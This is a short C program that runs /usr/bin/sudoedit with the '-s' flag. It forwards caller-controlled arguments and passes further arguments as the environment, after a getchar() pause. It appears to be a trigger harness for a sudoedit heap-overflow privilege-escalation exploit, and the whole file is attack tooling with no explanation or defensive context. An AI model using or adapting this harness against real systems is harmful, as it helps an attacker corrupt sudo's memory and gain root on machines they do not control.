

int main(int argc, char *argv[], char *envp[])
{
    char* _argv[] = {
        "/usr/bin/sudoedit",
        "-s", argv[1],
        0
    };
    getchar();
    execve("/usr/bin/sudoedit", _argv, &argv[2]);
}
